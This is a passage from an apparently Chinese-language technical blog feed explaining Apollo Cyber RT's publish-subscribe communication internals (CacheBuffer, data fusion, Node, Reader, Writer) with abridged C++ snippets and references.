class="hljs-built_in">Buffer</span>()-&gt;<span class="hljs-built_in">Fill</span>(data);<br>        &#125;);<br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>何时调用</strong> <code>FusionFunc</code> 呢？答案在这个 <code>Fill()</code> 函数（见下代码）中，它诡计多端——如果 <code>CacheBuffer</code> 有回调函数 <code>FusionFunc</code>，会调用回调函数；如果没有，会把接收到的数据放入缓冲区中。很显然在上面的构造函数中，只有信道 0 设置了回调函数 <code>FusionFunc</code>。<em>因此当信道 0 有数据到来， <code>DataDispatcher::Dispatch()</code> 被调用时（代码见 DataDispatcher 部分），进而调用 <code>Fill()</code> 函数时， <code>FusionFunc</code> 才会被调用</em>，将最新的消息融合，并将融合的消息填入到 <code>buffer_fusion_</code> 中。而其他信道的数据到来时， <code>Fill()</code> 函数只是单纯往对应的 <code>CacheBuffer</code> 中填数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CacheBuffer::Fill</span><span class="hljs-params">(<span class="hljs-type">const</span> T&amp; value)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (fusion_callback_)<br>    <span class="hljs-built_in">fusion_callback_</span>(value);  <span class="hljs-comment">// buffer 0 运行这个</span><br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Full</span>()) &#123;<br>      buffer_[<span class="hljs-built_in">GetIndex</span>(head_)] = value;<br>      ++head_;     ++tail_;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      buffer_[<span class="hljs-built_in">GetIndex</span>(tail_ + <span class="hljs-number">1</span>)] = value;<br>      ++tail_;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在协程的处理函数中（回顾一下， DataVisitor 的创建协程工厂中提到的）会调用 <code>DataVisitor::TryFetch()</code> 函数，再调用 <code>Fusion()</code> 函数（代码如下），它从融合数据的缓冲区 <code>buffer_fusion_</code> 中拿走（Fetch）融合消息，这也就意味着同时拿多个信道上的最新消息，保证了每次给 <code>Component::Process()</code> 函数的参数都必须“全员到齐”，并且所有信息都是最新的。综上所述，只有信道 0 收到消息后，才会融合其他信道的消息，往往主导通信处理的节奏，因此信道 0 的选取就比较关键了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DataVisitor::TryFetch</span><span class="hljs-params">(std::shared_ptr&lt;M0&gt;&amp; m0, std::shared_ptr&lt;M1&gt;&amp; m1)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (data_fusion_-&gt;<span class="hljs-built_in">Fusion</span>(&amp;next_msg_index_, m0, m1)) &#123;<br>    next_msg_index_++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">AllLatest::Fusion</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span>* index, std::shared_ptr&lt;M0&gt;&amp; m0,</span></span><br><span class="hljs-params"><span class="hljs-function">              std::shared_ptr&lt;M1&gt;&amp; m1)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>  std::shared_ptr&lt;FusionDataType&gt; fusion_data;<br>  <span class="hljs-comment">// 从 fusion 缓冲区中取数据</span><br>  <span class="hljs-keyword">if</span> (!buffer_fusion_.<span class="hljs-built_in">Fetch</span>(index, fusion_data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-comment">// 得到了数据 分别赋值给 m0 m1</span><br>  m0 = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">0</span>&gt;(*fusion_data);<br>  m1 = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">1</span>&gt;(*fusion_data);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChannelBuffer-CacheBuffer">ChannelBuffer &amp; CacheBuffer</h3><p>前文我一直提到一个词，叫做缓冲区。事实上这个词具体指向了两个类，<code>ChannelBuffer</code> 和 <code>CacheBuffer</code> 类。为了让读者更好地理解“缓冲区”这个词，我简要地介绍一下这两个类。<code>ChannelBuffer</code> 类包含了两个成员：信道 id 和 指向 <code>CacheBuffer</code> 的指针。它的函数 <code>Fetch()</code> 和 <code>Latest()</code> 分别用于取对应索引的消息和取得最新消息。而 <code>CacheBuffer</code> 类，其实质就是一个循环队列，用来放置某个信道产生的数据。需要注意的是，<code>CacheBuffer</code> 占用的内存是恒定的，因为里面的数组长度一开始就被限定了，所以，一旦缓冲区装满了，它会毫不犹豫地丢弃最旧的消息，推入最新的消息。具体的队列实现在 <code>cyber/data/cache_buffer.h</code> 和 <code>cyber/data/channel_buffer.h</code>，很简单，有兴趣可以直接读代码。</p><h2 id="总结">总结</h2><p>(⊙o⊙)哦终于，我把 Cyber RT 所有的通信机制都看完了，哦，BTW，上篇通信链接在<a href="https://dingfen.github.io/apollo/2020/11/03/CyberCommu1.html">这里</a>。现在，在把所有的内容都搞明白后，让我们理一理自己昏沉的头脑，跳脱出代码的边边框框，从上帝视角审视一下数据是如何流通的。</p><p>这里有两张非常好的图，感谢 [2]，我可以不用自己动手，花费数小时画图了😀</p><p><img src="/img/msg.png" alt=""></p><p>在上面这张图中，仍然以两个信道的 <code>Component</code> 为例，从左上角出发：</p><ul><li><code>Component</code> 初始化建成了两个 <code>Reader</code> 对象，然后创建了一个 <code>DataVisitor&lt;M0, M1&gt;</code> 对象</li><li>两个 <code>Reader</code> 对象也分别创建了一个 <code>DataVisitor&lt;&gt;</code> 对象，回顾一下上篇提到的 <code>Reader</code> 的初始化过程</li><li>这些 <code>DataVisitor</code> 对象会分别创建出 <code>ChannelBuffer</code> ，并使用 <code>DataDispatcher</code> 管理这些缓冲区（注意看它内部的表）</li><li>当接收到新消息后，<code>DataDispatcher</code> 会给对应的信道上的所有缓冲区进行分派，特别地，若信道 0 有新消息，还会对其他消息进行融合（注意看 <code>AllLatest</code> 对象）</li><li>之后，<code>DataVisitor</code> 会使用 <code>DataNotifier</code> 对象，唤醒相应的协程，处理收到的数据</li></ul><p>现在，我们再来看看底层的通信架构，虽然有些部分我略去未讲，但这张图我们还是可以看明白的🐶。这次，我们从最右边开始看起。</p><p><img src="/img/msg2.png" alt=""></p><ul><li>可以看出两个 <code>Reader</code> 对象共用了一个 <code>Receiver</code> 。这是因为在同一个进程内，不同的 <code>Reader</code> 对象订阅同一个信道，就会使用同一个 <code>Receiver</code></li><li>默认选择的 <code>Receiver</code> 是 hybrid 的，因此需要三个底层接收类 <code>IntraReceiver</code> 、<code>ShmReceiver</code> 和 <code>RtpsReceiver</code> 配合</li><li>在创建 <code>Receiver</code> 时，监听者处理函数 <code>msg_listener_</code> 就已经“准备就绪”了。</li><li><code>Dispatcher</code> 的表中记录了监听者和它们负责的信道，并把它们连接 <code>Connect</code> 起来，如同 Qt 中的信号槽机制</li><li>一有新消息到达（最左边的函数是我陌生的），那么就会立刻触发信号槽机制，调用 <code>msg_listener</code> 函数，之后就是上层 <code>DataDispatcher</code> 的工作了</li></ul><p>最后的最后，事实上我还是落了一个东西：服务—客户通信方式😓😓😂😂。的确，这篇博客的内容全是关于发布—订阅通信方式的，对于 <code>Service</code> 和 <code>Client</code> ，几乎没有提及，之后，我就会补上这一部分服务发现的内容。</p><h2 id="参考">参考</h2><p>[1] <a href="https://github.com/daohu527/Dig-into-Apollo/tree/master/cyber">Dig into Apollo - Cyber</a></p><p>[2] <a href="https://blog.csdn.net/jinzhuojun/article/details/108066714">自动驾驶平台Apollo 5.5阅读手记：Cyber RT中的通信传输</a></p><p>[3] <a href="https://blog.csdn.net/qq_25762163/article/details/103803032">百度Apollo系统学习-Cyber RT 通信-上层</a></p><p>[4] <a href="https://blog.csdn.net/kesalin/article/details/88914029">百度 Apollo Cyber RT简介、基本概念以及与 ROS 对照</a></p><p>[5] <a href="https://blog.csdn.net/qq_25762163/article/details/103895527">百度Apollo系统学习-Cyber RT 通信-底层</a></p><p>[6] <a href="https://cyber-rt.readthedocs.io/en/latest/api/cppapi.html#cyber-node-reader-h">cyber-rt.readthedocs.io</a></p><p>[7] 自动驾驶汽车平台技术基础/杨世春等编著. —北京：清华大学出版社</p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 通信（上）</title>
    <link href="/2020/11/03/2020-11-3-CyberCommu1/"/>
    <url>/2020/11/03/2020-11-3-CyberCommu1/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Cyber RT 通信（上）</h1><h2 id="前言">前言</h2><p>在<a href="https://dingfen.github.io/apollo/2020/10/25/CyberComponent.html">之前的博客</a>中，我和大家讨论了 Apollo Cyber RT 组件的相关内容，在介绍组件的内容时，我们谈到每个组件都有自己的读者信道 <code>Reader&lt;M&gt;</code> 和 <code>Node</code> 节点类对象， <code>DataVisitor</code> 数据访问类在创建协程工厂时也起到了关键作用。由此可见，通信问题已经成为了在学习 Cyber RT 过程中绕不过去的槛儿，那么，Cyber RT 怎么保证这么多的组件能够齐心协力，高效地完成一件件任务呢？今天我就来带领大家探讨一下这类问题。由于通信部分的内容过多，写在一篇博客里太长，所以我把它分成了两部分。</p><h3 id="ROS-的历史遗留">ROS 的历史遗留</h3><p>之前在研究 Apollo 时，我了解到 Apollo 3.5 版本前，各个模块直接通过一个简单的运行时框架，构建在 ROS 之上。</p><p><img src="/img/Apollo_3.0_diagram.png" alt=""></p><p>而之后的版本，都加上了 Cyber RT，它不仅仅是一个运行时框架，还承担了数据通信和任务调度，以及记录日志等任务。但是从软件工程的角度出发，对底层的大改必然会牵动上层，为了尽可能地不影响上层代码，Cyber RT 不得不依照 ROS 的“规矩”，提供有相同名称的功能近似的接口，这之后我们可以将 ROS 与 Cyber RT 进行比较。</p><p><img src="/img/Apollo_5_5_Architecture.png" alt=""></p><p>于是我就发现，与 ROS &amp; ROS2 中类似的是，Cyber RT 也支持两种通信方式，详情见<a href="https://dingfen.github.io/apollo/2020/10/14/apollo-intro.html#%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD%E4%BB%8B%E7%BB%8D">术语介绍</a>：</p><ul><li><strong>发布—订阅通信方式</strong>（Publish-Subscribe），也叫基于信道的通信方式，常用于数据流处理中节点间通信。即<strong>发布者</strong>（Publisher）在信道（channel，ROS 中对应地称为 topic）上发布消息，相应的<strong>订阅者</strong>（Subscriber）便会收到消息数据</li><li><strong>服务—客户通信方式</strong>（Service-Client），也叫基于服务的通信方式，常用于双向的、需要有请求和应答的通信场景。</li></ul><h2 id="三种通信模型-sup-7-sup">三种通信模型<sup>7</sup></h2><p>在 Cyber RT 中提供了不同的通信方式，以应对各类自动驾驶需求。根据上层模块所处的进程，可以将模块间的关系分为：</p><ul><li>同一进程内。在同一个进程节点之间的相互通信，对于进程内的数据，<strong>直接传递消息对象的指针</strong>，可以避免消息数据复制的开销，尤其是一些较大的消息，如点云和图像等</li><li>同主机进程间。在不同进程之间的节点传播或交换信息，可以利用<strong>共享内存传输</strong>，这样不仅可以减少传输中的数据复制，显著提升传输效率，还能够满足一对多的传输场景</li><li>跨主机。跨主机的数据利用 socket 传输，跨主机通信采用了第三方的开源库 <a href="https://www.eprosima.com/index.php/resources-all/rtps">Fast RTPS</a>（Real Time Publish Subscribe Protocol，实时发布订阅协议），是 DDS（Data Distribution Service）标准的一个非常流行的开源实现，支持 RTPS 协议版本的一个订阅发布消息组件，具有高性能，实时性高，多平台支持等优点</li></ul><h2 id="通信架构">通信架构</h2><span id="l" /><center><img src="/img/CyberLayer.png" /></center><p>首先来看一下通信的层级划分（上图）<sup>2</sup>，再重复一遍，自动驾驶系统中的各个模块基本都由 <code>Component</code> 类实现，而一个 <code>Component</code> 对象包含一个 <code>Node</code> 对象。<code>Node</code> 对象会根据需要创建和管理 <code>Writer</code>，<code>Reader</code>，<code>Service</code> 和 <code>Client</code> 对象。而在通信类下面， <code>Trasmitter</code> 和 <code>Receiver</code> 类。前者用于数据发送，后者用于数据接收。它们是数据传输层的抽象，而底下还有多个用于<strong>不同场景下的传输实现类</strong>，比如对于 <code>Trasmitter</code> 类，就有 <code>IntraTransmitter</code> 类，<code>ShmTransmitter</code> 类，<code>RtpsTransmitter</code> 类和 <code>HybridTransmitter</code> 类。同样地， <code>Receiver</code> 类也有类似的情况 。在这里我就简单地说明一下这些底层类的作用，因为这些东西过于细节，我往后也不会重点研究，但是还是有必要稍微了解一下的😀：</p><ul><li>RTPS 基于 <a href="https://www.eprosima.com/index.php/">eProsimar</a> 的 Fast RTPS，介绍同上</li><li>Shared memory 共享内存模式</li><li>Intra-Process 用于进程内通信</li><li>Hybrid 混合使用以上几种通信模式</li></ul><p>OK，接下来，我们放慢脚步，一层一层地剥开通信的实现情况🐶。</p><h3 id="节点-Node">节点 Node</h3><p><code>Node</code> 是整个数据拓扑网络中的基本单元。<code>Node</code> 对象会根据需要创建和管理 <code>Writer</code>，<code>Reader</code>，<code>Service</code> 和 <code>Client</code> 对象。<code>Reader</code> 和 <code>Writer</code>，用于发布—订阅模式。<code>Service</code> 和 <code>Client</code>，用于服务—客户模式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br> <span class="hljs-keyword">private</span><br>        std::string node_name_;<br>     std::string name_space_;<br>     std::map&lt;std::string, std::shared_ptr&lt;ReaderBase&gt;&gt; readers_;<br>     std::unique_ptr&lt;NodeChannelImpl&gt; node_channel_impl_ = <span class="hljs-literal">nullptr</span>;<br>     std::unique_ptr&lt;NodeServiceImpl&gt; node_service_impl_ = <span class="hljs-literal">nullptr</span>;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Node::CreateReader</span><span class="hljs-params">(<span class="hljs-type">const</span> ReaderConfig&amp; config, <span class="hljs-type">const</span> CallbackFunc&lt;MessageT&gt;&amp; reader_func)</span></span><br><span class="hljs-function">    -&gt; std::shared_ptr&lt;cyber::Reader&lt;MessageT&gt;&gt; </span>&#123;<br>  <span class="hljs-comment">/* ....  */</span><br>  <span class="hljs-keyword">auto</span> reader =<br>      node_channel_impl_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;MessageT&gt;(config, reader_func);<br>  <span class="hljs-comment">/* ....  */</span><br>  <span class="hljs-keyword">return</span> reader;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>Node</code> 类的成员变量：<code>NodeChannelImpl</code> 指针和 <code>NodeServiceImpl</code> 指针，对于我们进一步了解通信非常重要，因为在 <code>Node::CreateReader</code> 函数中，<code>Node</code> 使用了 <code>NodeChannelImpl</code> 指针创建 <code>Reader</code> 对象。同理于其他三个，<code>Node</code> 类都是使用相应的指针来创建对象，没错，它们才是幕后黑手。</p><h3 id="NodeChannelImpl-与-NodeServiceImpl-——幕后创建者">NodeChannelImpl 与 NodeServiceImpl ——幕后创建者</h3><p>为方便讨论，我以 <code>NodeChannelImpl</code> 类为例，并从 <code>CreateReader</code> 函数出发，在 <code>Node</code> 类中调用了 <code>NodeChannelImpl::CreateReader()</code> 后，</p><ol><li>创建 <code>RoleAttributes</code> 对象，把该对象的一些配置数据全部填好（如果你对该对象包含了什么很感兴趣，那么请看 <code>cyber/proto/role_attributes.proto</code>）</li><li>根据现在的模式（真实模式还是模拟模式），来决定如何创建读者类。根据代码，真实模式时使用 <code>Reader&lt;M&gt;</code> ，模拟模式使用 <code>IntraReader&lt;M&gt;</code></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 为方便说明，对代码进行裁减 真实代码情况见 cyber/node/node_channel_impl.h 文件</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">NodeChannelImpl::CreateReader</span><span class="hljs-params">(<span class="hljs-type">const</span> proto::RoleAttributes&amp; role_attr,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-type">const</span> CallbackFunc&lt;MessageT&gt;&amp; reader_func,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-type">uint32_t</span> pending_queue_size)</span></span><br><span class="hljs-function">    -&gt; std::shared_ptr&lt;Reader&lt;MessageT&gt;&gt; </span>&#123;<br>  <span class="hljs-comment">/*  ....  */</span><br>  <span class="hljs-function">proto::RoleAttributes <span class="hljs-title">new_attr</span><span class="hljs-params">(role_attr)</span></span>;<br>  <span class="hljs-built_in">FillInAttr</span>&lt;MessageT&gt;(&amp;new_attr);<br>  std::shared_ptr&lt;Reader&lt;MessageT&gt;&gt; reader_ptr = <span class="hljs-literal">nullptr</span>;<br>  <span class="hljs-keyword">if</span> (!is_reality_mode_)<br>    reader_ptr =<br>        std::make_shared&lt;blocker::IntraReader&lt;MessageT&gt;&gt;(new_attr, reader_func);<br>  <span class="hljs-keyword">else</span> <br>    reader_ptr = std::make_shared&lt;Reader&lt;MessageT&gt;&gt;(new_attr, reader_func,<br>                                                    pending_queue_size);<br>  <span class="hljs-keyword">return</span> reader_ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>令人感到安心的是，<code>NodeChannelImpl</code> 类在创建 <code>Write</code> 对象时，步骤与 <code>Reader</code> 几乎一致，甚至可以说，他们只是把几个关键词换了一下而已。</p><p>那么，对于 <code>NodeServiceImpl</code> 类，情况有没有改变呢？emm……情况稍有变化：（以 <code>Service</code> 类为例）</p><ol><li>直接创建 <code>Service</code> 对象，并进行初始化（初始化里干的事情日后再聊）</li><li>将创建好的 <code>Service</code> 指针放入到数组 <code>serivce_list_</code> 中</li><li>调用服务发现的拓扑管理类 <code>service_discovery::TopologyManager</code> 中的 <code>Join()</code> 函数（这边是个大坑，日后再聊+1 🐶）</li></ol><h3 id="Reader-Writer">Reader &amp;&amp; Writer</h3><p>比起服务—客户的通信模式，我更关注发布—订阅模式；比起模拟模式，我更关注真实模式，因此先作重点介绍。</p><h4 id="Reader-类">Reader 类</h4><p>那么兜兜转转，我们终于来到了读者类。首先来看一下 <code>Reader</code> 的基本情况。唔，它继承自 <code>ReaderBase</code> 类，它包含一个 <code>Blocker</code> 和一个 <code>Receiver</code> 对象，它们是我们要重点关注的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Reader</span> : <span class="hljs-keyword">public</span> ReaderBase &#123;<br> <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Reader</span><span class="hljs-params">(<span class="hljs-type">const</span> proto::RoleAttributes&amp; role_attr,</span></span><br><span class="hljs-params"><span class="hljs-function">              <span class="hljs-type">const</span> CallbackFunc&lt;MessageT&gt;&amp; reader_func = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">              <span class="hljs-type">uint32_t</span> pending_queue_size = DEFAULT_PENDING_QUEUE_SIZE)</span></span>;<br> <span class="hljs-keyword">protected</span>:<br>  <span class="hljs-type">double</span> latest_recv_time_sec_;<span class="hljs-comment">// 接受消息的最近时间</span><br>  <span class="hljs-type">double</span> second_to_lastest_recv_time_sec_ = <span class="hljs-number">-1.0</span>;<span class="hljs-comment">// 接受消息的第二近时间</span><br>  <span class="hljs-type">uint32_t</span> pending_queue_size_;<span class="hljs-comment">// 消息缓冲区的最大值</span><br> <span class="hljs-keyword">private</span>:<br>  CallbackFunc&lt;MessageT&gt; reader_func_;<br>  ReceiverPtr receiver_ = <span class="hljs-literal">nullptr</span>;<br>  std::string croutine_name_;<br>  BlockerPtr blocker_ = <span class="hljs-literal">nullptr</span>;<br>  ChangeConnection change_conn_;<br>  service_discovery::ChannelManagerPtr channel_manager_ = <span class="hljs-literal">nullptr</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>根据我们在上一小节的理解，<code>Reader</code> 对象只会在<strong>真实模式</strong>下被创建。既然已经说到了创建，我们就先来看一下 <code>Reader</code> 的创建过程吧😀。在 <code>Reader</code> 类的构造函数中，其类的 <code>Blocker</code> 成员也进行构造，这边的过程很简单。而进一步对 <code>Reader</code> 进行初始化，调用 <code>Reader::Init()</code> 函数时，情况就复杂了起来：</p><ol><li>创建回调函数。用 <code>Reader::Enqueue()</code> + 传入的回调函数封装出一个新的回调函数 <code>func</code></li><li><a href="https://dingfen.github.io/apollo/2020/10/25/CyberComponent.html#%E7%9C%9F%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%A8%A1%E6%8B%9F%E6%A8%A1%E5%BC%8F">与组件的初始化过程的最后几步相似</a>，<code>Reader</code> 类的初始化中，也拿出了 <code>Scheduler</code> 类，创建了 <code>DataVisitor</code> 对象（通信下篇会对其详细阐述）和协程工厂对象，并用它们创建了一个任务，目的就是将第一步中封装好的回调函数 <code>func</code> 包装为协程，最后根据调度算法的安排，在合适的时候调用。此外还把对应的协程名字记录到 <code>croutine_name_</code> 中</li><li>根据 <code>Reader</code> 对象的属性，从接收器管理类 <code>ReceiverManager&lt;M&gt;</code> 中取出相对应的 <code>Receiver</code> 对象，该对象用于接受消息</li><li>从 <code>service_discovery::TopologyManager</code> 那里拿到信道管理器 <code>channel_manager</code> ，最后把这个 <code>Reader</code> 对象加入到拓扑结构中</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 为方便说明，对代码进行裁减 真实代码情况见 cyber/node/reader.h 文件</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;  <span class="hljs-type">bool</span> Reader&lt;MessageT&gt;::<span class="hljs-built_in">Init</span>() &#123;<br> <span class="hljs-comment">/*  ....  */</span><br>    <span class="hljs-comment">// 第一步</span><br>  std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">const</span> std::shared_ptr&lt;MessageT&gt;&amp;)&gt; func;<br>    func = [<span class="hljs-keyword">this</span>](<span class="hljs-type">const</span> std::shared_ptr&lt;MessageT&gt;&amp; msg) &#123;<br>      <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Enqueue</span>(msg);<br>      <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">reader_func_</span>(msg);<br>    &#125;;<br>    <span class="hljs-comment">// 第二步</span><br>  <span class="hljs-keyword">auto</span> sched = scheduler::<span class="hljs-built_in">Instance</span>();<br>  croutine_name_ = role_attr_.<span class="hljs-built_in">node_name</span>() + <span class="hljs-string">&quot;_&quot;</span> + role_attr_.<span class="hljs-built_in">channel_name</span>();<br>  <span class="hljs-keyword">auto</span> dv = std::make_shared&lt;data::DataVisitor&lt;MessageT&gt;&gt;(<br>      role_attr_.<span class="hljs-built_in">channel_id</span>(), pending_queue_size_);<br>  croutine::RoutineFactory factory =<br>      croutine::<span class="hljs-built_in">CreateRoutineFactory</span>&lt;MessageT&gt;(std::<span class="hljs-built_in">move</span>(func), dv);<br>  sched-&gt;<span class="hljs-built_in">CreateTask</span>(factory, croutine_name_);<br><span class="hljs-comment">// 第三步</span><br>  receiver_ = ReceiverManager&lt;MessageT&gt;::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">GetReceiver</span>(role_attr_);<br>  <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">set_id</span>(receiver_-&gt;<span class="hljs-built_in">id</span>().<span class="hljs-built_in">HashValue</span>());<br> <span class="hljs-comment">// 第四步</span><br>  channel_manager_ = service_discovery::TopologyManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">channel_manager</span>();<br>  <span class="hljs-built_in">JoinTheTopology</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>好，那么 <code>Reader</code> 主要功能是什么呢？根据官方文档<sup>6</sup>，<code>Reader</code> 类订阅了一个信道，然后就有两个主要功能，这些都牵扯到后面要介绍的类，因此在这里就简单说明一下：</p><ul><li>传入一个回调函数 <code>CallbackFunc</code> ，用来处理刚刚到达的消息。“处理消息”的意思就是把消息压入 <code>Blocker</code> 类的队列中，然后用回调函数处理。</li><li>可以观察到 <code>Blocker</code> 类中的缓存消息。用户可以使用函数 <code>Observe()</code> 将消息从发布队列取出，放入到观察队列中。一个 <code>Reader</code> 使用一个 <code>ChannelBuffer</code> ，处理了的消息会被存放在这里。</li></ul><p>好，除了初始化和主要的功能，暂时不讨论其他 <code>Reader</code> 相关的函数，因为它们要么过于平凡，要么涉及到了服务发现的内容（我无法在一篇博客中讨论这么多东西），接下来，我们可以去看看 <code>Reader</code> 类的反面，<code>Writer</code> 类是怎么做的。</p><h4 id="Writer-类">Writer 类</h4><p>同样，从 <code>Writer</code> 类的组成开始，它继承 <code>WriterBase</code> 类，但组成比 <code>Reader</code> 类简单很多，只有一个 <code>Transmitter</code> 需要我们重点关注。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Writer</span> : <span class="hljs-keyword">public</span> WriterBase &#123;<br> <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Writer</span><span class="hljs-params">(<span class="hljs-type">const</span> proto::RoleAttributes&amp; role_attr)</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  TransmitterPtr transmitter_;<br>  ChangeConnection change_conn_;<br>  service_discovery::ChannelManagerPtr channel_manager_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>也一样，<code>Writer</code> 类只会在真实模式下被创建，其构建和初始化过程比 <code>Reader</code> 类对象简单：</p><ol><li>构建好 <code>WriterBase::role_attr</code> ，把基本的属性数据填充好</li><li>创建 <code>Transmitter</code> 对象（下文会提到）</li><li>从 <code>service_discovery::TopologyManager</code> 那里拿到信道管理器 <code>channel_manager</code> ，最后把该 <code>Writer</code> 对象加入到拓扑结构中</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span 